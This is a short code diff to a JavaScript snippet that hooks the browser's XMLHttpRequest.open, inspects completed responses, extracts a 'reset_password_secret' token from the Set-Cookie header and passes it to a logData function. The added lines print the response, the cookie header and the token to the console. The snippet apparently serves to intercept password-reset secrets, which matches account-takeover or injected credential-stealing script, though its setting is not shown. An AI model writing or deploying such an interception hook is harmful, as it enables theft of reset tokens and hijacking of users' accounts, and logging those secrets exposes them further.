@@ -28,16 +28,21 @@
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
                 this.addEventListener("readystatechange", function () {
+                    console.log('Ready state changed:', this.readyState);
                     if (this.readyState === 4) {
+                        console.log('Response received:', this.responseText);
                         if (this.status === 201) {
                             try {
                                 const response = JSON.parse(this.responseText);
+                                console.log('Parsed response:', response);
                                 const setCookieHeader = this.getResponseHeader('Set-Cookie');
+                                console.log('Set-Cookie header:', setCookieHeader);
                                 if (setCookieHeader) {
                                     const cookies = setCookieHeader.split(';');
                                     cookies.forEach(cookie => {
                                         if (cookie.includes('reset_password_secret=')) {
                                             const token = cookie.split('=')[1];
+                                            console.log('Token found:', token);
                                             logData({ token: token });
                                         }
                                     });
